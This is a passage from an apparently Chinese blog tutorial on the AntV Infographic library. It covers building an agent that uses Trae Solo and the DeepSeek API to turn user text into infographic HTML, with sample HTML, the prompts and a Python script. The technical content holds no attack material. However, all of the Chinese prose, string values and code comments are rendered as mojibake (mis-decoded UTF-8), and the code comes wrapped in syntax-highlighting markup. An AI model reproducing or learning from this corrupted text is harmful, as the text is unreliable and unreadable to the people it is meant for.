<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Infographic Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"container"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://unpkg.com/@antv/infographic@latest/dist/infographic.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
      <span class="hljs-keyword">const</span> {<span class="hljs-title class_">Infographic</span>} = <span class="hljs-title class_">AntVInfographic</span>;
      <span class="hljs-keyword">const</span> infographic = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Infographic</span>({
        <span class="hljs-attr">container</span>: <span class="hljs-string">'#container'</span>,
        <span class="hljs-attr">width</span>: <span class="hljs-string">'100%'</span>,
        <span class="hljs-attr">height</span>: <span class="hljs-string">'100%'</span>,
        <span class="hljs-attr">template</span>: <span class="hljs-string">'list-row-simple-horizontal-arrow'</span>,
        <span class="hljs-attr">data</span>: {
          <span class="hljs-attr">items</span>: [
            {<span class="hljs-attr">label</span>: <span class="hljs-string">'æ­¥éª¤ 1'</span>, <span class="hljs-attr">desc</span>: <span class="hljs-string">'å¼€å§‹'</span>},
            {<span class="hljs-attr">label</span>: <span class="hljs-string">'æ­¥éª¤ 2'</span>, <span class="hljs-attr">desc</span>: <span class="hljs-string">'è¿›è¡Œä¸­'</span>},
            {<span class="hljs-attr">label</span>: <span class="hljs-string">'æ­¥éª¤ 3'</span>, <span class="hljs-attr">desc</span>: <span class="hljs-string">'å®Œæˆ'</span>},
          ],
        },
      });
      infographic.<span class="hljs-title function_">render</span>();
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6ac9e0af746441d83865bdf8afc599b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765926905&amp;x-signature=rww0w%2F8xU6nn4k0oVn0YQGWtwRI%3D" alt="4.png" loading="lazy"/></p>
<p>è‡³æ­¤ï¼Œå¤§å®¶å·²ç»æŒæ¡äº† AntV Infographic çš„æ ¸å¿ƒç”¨æ³•ã€‚å¦‚æœä½ æƒ³æ·±å…¥äº†è§£å…¶æ‰€æœ‰åŠŸèƒ½ï¼Œå»ºè®®æŸ¥é˜…Â <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Finfographic.antv.vision%2Flearn" target="_blank" title="https://infographic.antv.vision/learn" ref="nofollow noopener noreferrer">å®˜æ–¹æ•™ç¨‹</a></strong>ã€‚æ¥ä¸‹æ¥ï¼Œç¬”è€…å°†è¿›å…¥å®æˆ˜ç¯èŠ‚ï¼Œçœ‹çœ‹å¦‚ä½•å°†å®ƒä¸æ™ºèƒ½ä½“ï¼ˆAgentï¼‰æŠ€æœ¯ç»“åˆï¼Œæ‰“é€ ä¸€ä¸ªçœŸæ­£â€œèƒ½è¯´ä¼šç”»â€çš„å›¾è¡¨ç”Ÿæˆå™¨ã€‚</p>
<h2 data-id="heading-6">äºŒã€åŸºäºAntV Infographicçš„å›¾è¡¨ç”Ÿæˆæ™ºèƒ½ä½“</h2>
<p>ç¬”è€…åœ¨æ–‡ç«  <a href="https://juejin.cn/post/7580723992498438180" target="_blank" title="https://juejin.cn/post/7580723992498438180">LangChain1.0å®æˆ˜ä¹‹å¤šæ¨¡æ€RAGç³»ç»Ÿï¼ˆå››ï¼‰â€”â€”Trae Soloæ­å»ºéƒ¨ç½²å¤šæ¨¡æ€RAGå‰ç«¯(é™„AIç¼–ç¨‹å®è·µæŒ‡å—)</a>ä»‹ç»äº†Â <strong>Vibe Codingï¼ˆæ°›å›´ç¼–ç¨‹ï¼‰</strong> Â çš„ç†å¿µï¼Œå¹¶å±•ç¤ºäº†å¦‚ä½•åˆ©ç”¨å­—èŠ‚è·³åŠ¨çš„Â <strong>Trae Solo</strong>Â æ¨¡å¼ï¼Œä»…å‡­è‡ªç„¶è¯­è¨€æè¿°å°±èƒ½å¿«é€Ÿå¼€å‘å‡ºåŠŸèƒ½å®Œæ•´çš„å‰ç«¯åº”ç”¨ã€‚</p>
<p>è¿™æ¬¡ç¬”è€…åŒæ ·è¦å€ŸåŠ© Vibe Coding çš„åŠ›é‡ï¼Œå¹¶éµå¾ªå…¶<a href="https://juejin.cn/post/7580723992498438180" target="_blank" title="https://juejin.cn/post/7580723992498438180">æœ€ä½³å®è·µ</a>ï¼Œå¿«é€Ÿæ„å»ºä¸€ä¸ªèƒ½å¤Ÿç†è§£éœ€æ±‚ã€è‡ªåŠ¨ç”Ÿæˆç²¾ç¾ä¿¡æ¯å›¾çš„æ™ºèƒ½ä½“ã€‚</p>
<h3 data-id="heading-7">2.1 æ ¸å¿ƒæ€è·¯ï¼šè®©å¤§æ¨¡å‹â€œå­¦ä¼šâ€å›¾è¡¨é…ç½®</h3>
<p>è¦æ„å»ºè¿™ä¸ªæ™ºèƒ½ä½“ï¼Œé¦–å…ˆè¦ç†æ¸…å®ƒçš„è¿ä½œé€»è¾‘ã€‚<code>AntV Infographic</code>Â ç”Ÿæˆå›¾è¡¨é«˜åº¦ä¾èµ–é…ç½®é¡¹ï¼ˆ<code>data</code>,Â <code>design</code>,Â <code>theme</code>ï¼‰ï¼Œè€Œå®˜æ–¹åˆæä¾›äº†ä¸°å¯Œçš„æ¨¡æ¿åº“ã€‚é‚£ä¹ˆä¸€ä¸ªå¾ˆè‡ªç„¶çš„æƒ³æ³•æ˜¯ï¼š<strong>èƒ½å¦è®©å¤§æ¨¡å‹å……å½“â€œé…ç½®å·¥ç¨‹å¸ˆâ€ï¼Ÿ</strong> Â è®©å¤§æ¨¡å‹ä»ç”¨æˆ·è¾“å…¥çš„è‡ªç„¶è¯­è¨€æè¿°ä¸­ï¼Œæ™ºèƒ½åœ°æŠ½å–å‡ºå…³é”®æ•°æ®ã€åˆ¤æ–­åˆé€‚çš„å›¾è¡¨ç±»å‹ï¼ˆé€‰æ‹©æ¨¡æ¿ï¼‰ï¼Œå¹¶ç”Ÿæˆå®Œæ•´çš„Â <code>Infographic</code>Â é…ç½®ä»£ç ã€‚è¿™ä¸ªæƒ³æ³•ä¸ AntV å®˜æ–¹çš„Â <a href="https://link.juejin.cn?target=https%3A%2F%2Finfographic.antv.vision%2Fai" target="_blank" title="https://infographic.antv.vision/ai" ref="nofollow noopener noreferrer">AI Infographic</a>Â ç½‘ç«™ä¸è°‹è€Œåˆã€‚</p>
<p>ä¸ºäº†è®©å¤§æ¨¡å‹æŒæ¡è¿™é¡¹æŠ€èƒ½ç¬”è€…éœ€è¦ç»™å®ƒä¸€ä»½â€œè¯´æ˜ä¹¦â€ã€‚æœ€ç›´æ¥çš„æ–¹å¼å°±æ˜¯å€Ÿé‰´å®˜æ–¹ AI åŠŸèƒ½çš„æç¤ºè¯ï¼ˆPromptï¼‰ã€‚é€šè¿‡æµè§ˆå™¨çš„å¼€å‘è€…å·¥å…·ï¼ˆNetwork é¢æ¿ï¼‰ç¬”è€…æ•è·åˆ°Â <a href="https://link.juejin.cn?target=https%3A%2F%2Finfographic.antv.vision%2Fai" target="_blank" title="https://infographic.antv.vision/ai" ref="nofollow noopener noreferrer">AI Infographic</a>Â ç½‘ç«™ä¸å¤§æ¨¡å‹äº¤äº’æ—¶ä½¿ç”¨çš„æç¤ºè¯æ¨¡æ¿ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8914f3ef01754d01a3e2adafe1fcd722~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765926905&amp;x-signature=RBIvmVZIU%2FbRda9uUxgvj7xd7Ws%3D" alt="5.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28720350e3284ebfa8f1da006c5f4723~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765926905&amp;x-signature=UTyYsDJO%2FBKGh%2BU1TmedTIyZGaM%3D" alt="6.png" loading="lazy"/></p>
<p>è·å–åˆ°çš„æç¤ºè¯ç¬”è€…å°†å…¶ä¿å­˜åœ¨<code>æç¤ºè¯.txt</code>æ–‡ä»¶ä¸­ã€‚é™äºç¯‡å¹…åŸå› ï¼Œæç¤ºè¯å°±ä¸åœ¨è¿™é‡Œå±•ç¤ºå•¦ï¼Œæ„Ÿå…´è¶£çš„å°ä¼™ä¼´å¤§å®¶å¯ä»¥å…³æ³¨ç¬”è€…åŒåå¾®ä¿¡å…¬ä¼—å·ï¼š<strong>å¤§æ¨¡å‹çœŸå¥½ç©</strong>ï¼Œ å¹¶ç§ä¿¡ <strong>Infographicæ™ºèƒ½ä½“</strong> è·å¾—å…¨éƒ¨æºç ã€‚</p>
<h3 data-id="heading-8">2.2 ç¼–å†™ç»“æ„åŒ–ä»£ç å¼€å‘æç¤ºè¯</h3>
<p>æœ‰äº†æ ¸å¿ƒæ€è·¯å’Œæç¤ºè¯åŸºç¡€ï¼Œæ¥ä¸‹æ¥å°±è½®åˆ° <strong>Vibe Coding</strong> ä¸Šåœºäº†ã€‚éµå¾ªæœ€ä½³å®è·µçš„ç¬¬ä¸€æ­¥ï¼Œç¬”è€…éœ€è¦ä¸º <strong>Trae Solo</strong> æ’°å†™ä¸€ä»½ç»“æ„æ¸…æ™°ã€è¦ç´ å®Œæ•´çš„æç¤ºè¯ã€‚</p>
<ol>
<li><strong>è§’è‰²å®šä½ï¼š</strong> æ˜ç¡®èµ‹äºˆ Trae Solo ä¸€ä¸ªä¸“ä¸šèº«ä»½å’Œèƒ½åŠ›èŒƒå›´</li>
</ol>
<pre><code class="hljs language-text" lang="text">ä½ æ˜¯ä¸€ä¸ªæ™ºèƒ½ä½“åº”ç”¨å¼€å‘äººå‘˜ï¼Œç†Ÿç»ƒæŒæ¡ä½¿ç”¨langchain1.0 pythonè¯­è¨€å¼€å‘ä¸€ä¸ªæ™ºèƒ½ä½“
</code></pre>
<ol start="2">
<li><strong>æ¸…æ™°éœ€æ±‚ï¼š</strong> è¯¦ç»†æè¿°ä¸šåŠ¡åœºæ™¯ä¸åŠŸèƒ½ç‚¹</li>
</ol>
<pre><code class="hljs language-text" lang="text">è¯¥æ™ºèƒ½ä½“å¯ä»¥é€šè¿‡æ ¹æ®ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œé‡‡ç”¨æç¤ºè¯.txtæ–‡ä»¶ä¸­çš„æç¤ºè¯ï¼Œç”Ÿæˆä¸€ä¸ª.htmlæ–‡ä»¶ã€‚
è¯¥æ™ºèƒ½ä½“ä½¿ç”¨deepseekæ¥å£ä½œä¸ºå¤§æ¨¡å‹æœåŠ¡ï¼Œapi keyåœ¨.envæ–‡ä»¶é…ç½®ä¸­ï¼Œè¯¥æ™ºèƒ½ä½“ä¼šæ ¹æ®ç”¨æˆ·è¾“å…¥æ­é…æˆ‘æç¤ºè¯.txtä¸­çš„å†…å®¹ï¼Œç”Ÿæˆç›¸å…³é…ç½®ã€‚åŒæ—¶å‚è€ƒexample.htmlä¸­çš„ä»£ç ï¼Œå°†å…¶ä¸­çš„infographicé…ç½®é¡¹æ›¿æ¢æˆä½ ç”Ÿæˆçš„é…ç½®é¡¹
</code></pre>
<ol start="3">
<li><strong>æ˜ç¡®çš„ä»»åŠ¡:</strong> å°†éœ€æ±‚è½¬åŒ–ä¸ºå…·ä½“çš„å¼€å‘æŒ‡ä»¤</li>
</ol>
<pre><code class="hljs language-text" lang="text">è¯·ä½¿ç”¨Pythonä»£ç å’ŒLangchain1.0ç‰ˆæœ¬ç”Ÿæˆæˆ‘çš„éœ€æ±‚
</code></pre>
<ol start="4">
<li><strong>ä»£ç çº¦æŸè§„èŒƒ:</strong> å› ä¸ºè¿™é‡Œçš„ä»£ç æ¯”è¾ƒç®€å•ï¼Œå±äºç©å…·ä»£ç ä¹Ÿä¸æ˜¯å®Œæ•´é¡¹ç›®ï¼Œè¿™é‡Œå°±ä¸å†™å•¦ï¼Œä½†å¤§å®¶è¦ç³»ç»Ÿå¼€å‘é¡¹ç›®è¿˜æ˜¯åº”è¯¥åŠ ä¸Šã€‚</li>
</ol>
<h3 data-id="heading-9">2.3 DeepSeekæç¤ºä¼˜åŒ–</h3>
<p>åŸå§‹æç¤ºè¯å·²ç»å…·å¤‡äº†æ‰€æœ‰è¦ç´ ï¼Œä½†å…¶è¡¨è¿°åå‘å£è¯­åŒ–ï¼Œé€»è¾‘è¿è´¯æ€§æœ‰å¾…åŠ å¼ºã€‚ç°åœ¨ç¬”è€…æ‰§è¡Œç¬¬äºŒæ­¥ï¼šä½¿ç”¨å¦ä¸€ä¸ªå¤§æ¨¡å‹ï¼ˆè¿™é‡Œé€‰ç”¨ DeepSeekï¼‰å¯¹æç¤ºè¯è¿›è¡Œä¼˜åŒ–ï¼Œä½¿å…¶æ›´ç¬¦åˆå¤§æ¨¡å‹çš„â€œé˜…è¯»ä¹ æƒ¯â€ã€‚</p>
<p><strong>åŸå§‹æç¤ºè¯:</strong></p>
<pre><code class="hljs language-text" lang="text">ä½ æ˜¯ä¸€ä¸ªæ™ºèƒ½ä½“åº”ç”¨å¼€å‘äººå‘˜ï¼Œç†Ÿç»ƒæŒæ¡ä½¿ç”¨langchain1.0 pythonè¯­è¨€å¼€å‘ä¸€ä¸ªæ™ºèƒ½ä½“ã€‚è¯¥æ™ºèƒ½ä½“å¯ä»¥é€šè¿‡æ ¹æ®ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œé‡‡ç”¨æç¤ºè¯.txtæ–‡ä»¶ä¸­çš„æç¤ºè¯ï¼Œç”Ÿæˆä¸€ä¸ª.htmlæ–‡ä»¶ã€‚
è¯¥æ™ºèƒ½ä½“ä½¿ç”¨deepseekæ¥å£ä½œä¸ºå¤§æ¨¡å‹æœåŠ¡ï¼Œapi keyåœ¨.envæ–‡ä»¶é…ç½®ä¸­ï¼Œè¯¥æ™ºèƒ½ä½“ä¼šæ ¹æ®ç”¨æˆ·è¾“å…¥æ­é…æˆ‘æç¤ºè¯.txtä¸­çš„å†…å®¹ï¼Œç”Ÿæˆç›¸å…³é…ç½®ã€‚åŒæ—¶å‚è€ƒexample.htmlä¸­çš„ä»£ç ï¼Œå°†å…¶ä¸­çš„infographicé…ç½®é¡¹æ›¿æ¢æˆä½ ç”Ÿæˆçš„é…ç½®é¡¹ã€‚
è¯·ä½¿ç”¨Pythonä»£ç å’ŒLangchain1.0ç‰ˆæœ¬ç”Ÿæˆæˆ‘çš„éœ€æ±‚
</code></pre>
<p><strong>DeepSeekä¼˜åŒ–åçš„ç»“æœ:</strong></p>
<pre><code class="hljs language-text" lang="text">é¡¹ç›®æ¦‚è¿°ï¼š
å¼€å‘ä¸€ä¸ªåŸºäºLangChainçš„æ™ºèƒ½ä½“åº”ç”¨ï¼Œå®ƒèƒ½å¤Ÿï¼š1. è¯»å–ç”¨æˆ·è¾“å…¥çš„æ–‡æœ¬æ•°æ® 2. ç»“åˆæç¤ºè¯.txtæ–‡ä»¶ä¸­çš„æç¤ºè¯æ¨¡æ¿ 3. è°ƒç”¨DeepSeek APIç”Ÿæˆé…ç½®é¡¹ 4. è¯»å–example.htmlä¸­çš„ä»£ç ï¼Œä½¿ç”¨æ–°ç”Ÿæˆçš„é…ç½®é¡¹æ›¿æ¢æ‰example.htmlä¸­infographicçš„é…ç½®é¡¹ï¼Œå¹¶å†™å…¥æ–°çš„åä¸ºexample-result.htmlçš„æ–‡ä»¶ä¸­ã€‚
åŠŸèƒ½è¯¦ç»†éœ€æ±‚ï¼š
è¾“å…¥å¤„ç†ï¼šæ™ºèƒ½ä½“æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„æ–‡æœ¬æ•°æ®ä½œä¸ºå†…å®¹ç´ æ
è¯»å–æç¤ºè¯.txtæ–‡ä»¶ä½œä¸ºç³»ç»Ÿæç¤ºè¯
é…ç½®ç®¡ç†ï¼š
APIå¯†é’¥ä».envæ–‡ä»¶ä¸­è¯»å–ï¼Œå˜é‡åå»ºè®®ä¸ºDEEPSEEK_API_KEY
æ”¯æŒé…ç½®DeepSeekæ¨¡å‹å‚æ•°ï¼ˆå¦‚temperature, max_tokensç­‰ï¼‰
æ ¸å¿ƒåŠŸèƒ½ï¼š
1. å°†ç”¨æˆ·è¾“å…¥ä¸æç¤ºè¯æ¨¡æ¿æ™ºèƒ½ç»“åˆ
2. è°ƒç”¨DeepSeek APIç”Ÿæˆæ­£ç¡®çš„é…ç½®
3. ç¡®ä¿æ›¿æ¢åçš„HTMLæ–‡ä»¶å¯ç›´æ¥åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€å¹¶æ­£ç¡®æ˜¾ç¤º
æ–‡ä»¶æ“ä½œï¼š
è¯»å–ï¼šæç¤ºè¯.txtï¼ˆæç¤ºè¯æ¨¡æ¿ï¼‰
å†™å…¥ï¼šexample-result.htmlï¼ˆæœ€ç»ˆç”Ÿæˆçš„HTMLæ–‡ä»¶ï¼‰
é…ç½®ï¼š.envï¼ˆAPIå¯†é’¥é…ç½®ï¼‰
æ‰€æœ‰æ–‡ä»¶å‡ä¸ºutf-8ç¼–ç æ ¼å¼
æ™ºèƒ½ä½“è®¾è®¡ï¼š
1. ä½¿ç”¨LangChainçš„Agentæ¡†æ¶
2. åŒ…å«é”™è¯¯å¤„ç†æœºåˆ¶ï¼ˆAPIè°ƒç”¨å¤±è´¥ã€æ–‡ä»¶è¯»å–é”™è¯¯ç­‰ï¼‰
æä¾›æ¸…æ™°çš„æ‰§è¡ŒçŠ¶æ€åé¦ˆ
</code></pre>
<p>ä¼˜åŒ–åçš„æç¤ºè¯å±‚çº§åˆ†æ˜ã€æŒ‡ä»¤æ˜ç¡®ï¼Œæ¶ˆé™¤äº†å†—ä½™å’Œæ­§ä¹‰ã€‚æ­¤æ—¶å°†å…¶æäº¤ç»™ <strong>Trae Solo</strong>ï¼Œèƒ½å¤Ÿç¡®ä¿æŒ‡ä»¤è¢«æœ€é«˜æ•ˆã€æœ€å‡†ç¡®åœ°æ‰§è¡Œã€‚</p>
<h3 data-id="heading-10">2.4 Trae Solo è‡ªåŠ¨å¼€å‘</h3>
<p>å°†ä¼˜åŒ–åçš„æç¤ºè¯æäº¤ç»™ <strong>Trae Solo</strong>ï¼Œå®ƒä¾¿å¼€å§‹è‡ªåŠ¨è¿›è¡Œä»£ç å¼€å‘ã€‚æ•´ä¸ªè¿‡ç¨‹æµç•…ï¼Œ<strong>Trae Solo</strong> ä¾æ¬¡å®Œæˆäº†ç¯å¢ƒè®¾ç½®ã€æ–‡ä»¶è¯»å–ã€API è°ƒç”¨ã€æ¨¡æ¿æ›¿æ¢ç­‰æ ¸å¿ƒæ¨¡å—çš„ç¼–å†™ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b085f6f37e28408987f5f4581ad62dfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765926905&amp;x-signature=iZvbp7SIV17YYIGfc%2BK6vDwVC0g%3D" alt="8.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/feffbf2b7edc4f1c85439b487ac8e6a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765926905&amp;x-signature=PzDLce5D5ciNRcjAODVWN7Kkwfs%3D" alt="9.png" loading="lazy"/></p>
<p>ç¬”è€…å®¡æŸ¥ä¸€ä¸‹ç”Ÿæˆçš„Â <code>infographic_agent.py</code>Â æ ¸å¿ƒä»£ç é€»è¾‘ã€‚è™½ç„¶ Trae Solo æœ¬æ¬¡<strong>å¹¶æœªä¸¥æ ¼ä½¿ç”¨ LangChain æ¡†æ¶</strong>ï¼ˆè¿™åæ˜ äº†å½“å‰ AI ç¼–ç¨‹å·¥å…·åœ¨ç²¾å‡†éµå¾ªæ¡†æ¶æŒ‡ä»¤ä¸Šä»æœ‰æå‡ç©ºé—´ï¼‰ï¼Œä½†å®ƒç”Ÿæˆçš„ä»£ç é€»è¾‘æ¸…æ™°ã€åŠŸèƒ½å®Œæ•´ï¼š</p>
<ol>
<li><strong>åŠ è½½ç¯å¢ƒ</strong>ï¼šè¯»å–Â <code>.env</code>Â ä¸­çš„ API Keyã€‚</li>
<li><strong>è¯»å–çŸ¥è¯†</strong>ï¼šåŠ è½½Â <code>æç¤ºè¯.txt</code>Â ä¸­çš„æ¨¡æ¿ã€‚</li>
<li><strong>è·å–è¾“å…¥</strong>ï¼šæ¥æ”¶ç”¨æˆ·æè¿°æ–‡æœ¬ã€‚</li>
<li><strong>è°ƒç”¨å¤§æ¨¡å‹</strong>ï¼šæ‹¼æ¥æç¤ºè¯å’Œç”¨æˆ·è¾“å…¥ï¼Œè¯·æ±‚ DeepSeek API ç”Ÿæˆé…ç½®ã€‚</li>
<li><strong>æ›¿æ¢æ¨¡æ¿</strong>ï¼šè¯»å–Â <code>example.html</code>ï¼Œå°†å…¶ä¸­é¢„è®¾çš„é…ç½®æ›¿æ¢ä¸ºæ–°ç”Ÿæˆçš„é…ç½®ã€‚</li>
<li><strong>è¾“å‡ºç»“æœ</strong>ï¼šä¿å­˜ä¸ºæ–°çš„Â <code>example-result.html</code>Â æ–‡ä»¶ã€‚</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ... (ä»£ç å¯¼å…¥å’Œç¯å¢ƒåŠ è½½éƒ¨åˆ†)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-comment"># 1. åŠ è½½ç¯å¢ƒå˜é‡</span>
    load_dotenv()
    api_key = os.getenv(<span class="hljs-string">"DEEPSEEK_API_KEY"</span>)
    <span class="hljs-comment"># ... (æ ¡éªŒAPI Key)</span>

    <span class="hljs-comment"># 2. è¯»å–æç¤ºè¯æ¨¡æ¿</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"æç¤ºè¯.txt"</span>, <span class="hljs-string">"r"</span>, encoding=<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">as</span> f:
        prompt_template = f.read()
    
    <span class="hljs-comment"># 3. è·å–ç”¨æˆ·è¾“å…¥</span>
    user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">"è¯·è¾“å…¥æ–‡æœ¬æ•°æ®ä½œä¸ºå†…å®¹ç´ æ: "</span>)
    
    <span class="hljs-comment"># 4. è°ƒç”¨DeepSeek APIç”Ÿæˆé…ç½®</span>
    headers = {<span class="hljs-string">"Authorization"</span>: <span class="hljs-string">f"Bearer <span class="hljs-subst">{api_key}</span>"</span>, <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>}
    payload = {
        <span class="hljs-string">"model"</span>: <span class="hljs-string">"deepseek-chat"</span>,
        <span class="hljs-string">"messages"</span>: [
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: prompt_template},
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: user_input}
        ],
        <span class="hljs-string">"temperature"</span>: <span class="hljs-number">0.7</span>,
        <span class="hljs-string">"max_tokens"</span>: <span class="hljs-number">2048</span>,
        <span class="hljs-string">"response_format"</span>: {<span class="hljs-string">"type"</span>: <span class="hljs-string">"json_object"</span>} <span class="hljs-comment"># å…³é”®ï¼šè¦æ±‚è¿”å›JSON</span>
    }
    response = requests.post(<span class="hljs-string">"https://api.deepseek.com/v1/chat/completions"</span>, ...)
    config = response.json() <span class="hljs-comment"># è§£æå¤§æ¨¡å‹è¿”å›çš„é…ç½®</span>
    
    <span class="hljs-comment"># 5. è¯»å–å¹¶æ›¿æ¢HTMLæ¨¡æ¿</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"example.html"</span>, <span class="hljs-string">"r"</span>, encoding=<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">as</span> f:
        html_content = f.read()
    <span class="hljs-comment"># ... (ä½¿ç”¨ç”Ÿæˆçš„configæ›¿æ¢htmlä¸­çš„Infographicé…ç½®é¡¹)</span>
    
    <span class="hljs-comment"># 6. å†™å…¥æ–°æ–‡ä»¶</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"example-result.html"</span>, <span class="hljs-string">"w"</span>, encoding=<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">as</span> f:
        f.write(updated_html)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"âœ… æ“ä½œå®Œæˆï¼"</span>)
<span class="hljs-comment"># ... (ä¸»å‡½æ•°è°ƒç”¨)</span>
</code></pre>
<h3 data-id="heading-11">2.5 æµ‹è¯•ä¸æ•ˆæœå±•ç¤º</h3>
<p><strong>æµ‹è¯•æµç¨‹</strong>ï¼š</p>
<p>è¿è¡ŒÂ <code>python infographic_agent.py</code>ï¼Œå¹¶è¾“å…¥ä¸€æ®µä¸šåŠ¡æè¿°ï¼š</p>
<pre><code class="hljs language-text" lang="text">2020å¹´èšç„¦äºšå¤ªå¸‚åœºï¼Œè¥æ”¶å æ¯”60%ã€‚
2021å¹´æ‹“å±•æ¬§æ´²å¸‚åœºï¼Œå æ¯”æå‡è‡³25%ã€‚
2022å¹´è¿›å†›åŒ—ç¾ï¼Œä¸‰å¤§å¸‚åœºå½¢æˆå‡è¡¡æ ¼å±€ï¼Œåˆ†åˆ«ä¸º40%ã€30%ã€25%ã€‚2023å¹´æ–°å…´å¸‚åœºçªç ´ï¼Œæ‹‰ç¾å’Œä¸­ä¸œåˆè®¡è´¡çŒ®15%ï¼Œå…¨çƒåŒ–å¸ƒå±€åˆæ­¥å®Œæˆã€‚
</code></pre>
<p>ç¨‹åºè¿è¡Œåï¼ŒæˆåŠŸç”Ÿæˆäº†Â <code>example-result.html</code>ã€‚åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€å¾—åˆ°äº†ä¸€ä¸ªå¯è§†åŒ–å…¨çƒå¸‚åœºæ‹“å±•å†ç¨‹çš„ä¿¡æ¯å›¾</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c615501220549c2ad4762a4edad43dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765926905&amp;x-signature=KxWNKXyFCjFYDl%2BVDVN3b4YKOXE%3D" alt="10.png" loading="lazy"/></p>
<p><strong>æ•ˆæœåˆ†æ</strong>ï¼š</p>
<p>æ™ºèƒ½ä½“æˆåŠŸç†è§£äº†æ—¶é—´åºåˆ—æ•°æ®ï¼Œå¹¶é€‰æ‹©äº†ä¸€ä¸ªåˆé€‚çš„æ—¶é—´çº¿æ¨¡æ¿è¿›è¡Œå±•ç¤ºã€‚å®ƒå°†å„å¹´ä»½çš„å¸‚åœºåˆ†å¸ƒæ•°æ®æå–å¹¶ç»“æ„åŒ–ï¼Œç”Ÿæˆäº†ä¸€ä»½åŸºæœ¬å¯ç”¨çš„ä¿¡æ¯å›¾ã€‚å½“ç„¶ï¼Œä¸å®˜æ–¹Â <a href="https://link.juejin.cn?target=https%3A%2F%2Finfographic.antv.vision%2Fai" target="_blank" title="https://infographic.antv.vision/ai" ref="nofollow noopener noreferrer">AI Infographic</a>Â çš„äº§å‡ºç›¸æ¯”ï¼Œåœ¨ç»†èŠ‚ä¼˜åŒ–ã€å›¾è¡¨ç²¾å‡†åº¦å’Œè§†è§‰ä¸°å¯Œåº¦ä¸Šè¿˜æœ‰å·®è·ï¼Œè¿™å¯èƒ½ä¸æç¤ºè¯çš„å®Œæ•´æ€§ã€æ¨¡å‹å‚æ•°è°ƒä¼˜ç­‰å› ç´ æœ‰å…³ï¼Œå€¼å¾—è¿›ä¸€æ­¥æ¢ç´¢å’Œä¼˜åŒ–ã€‚</p>
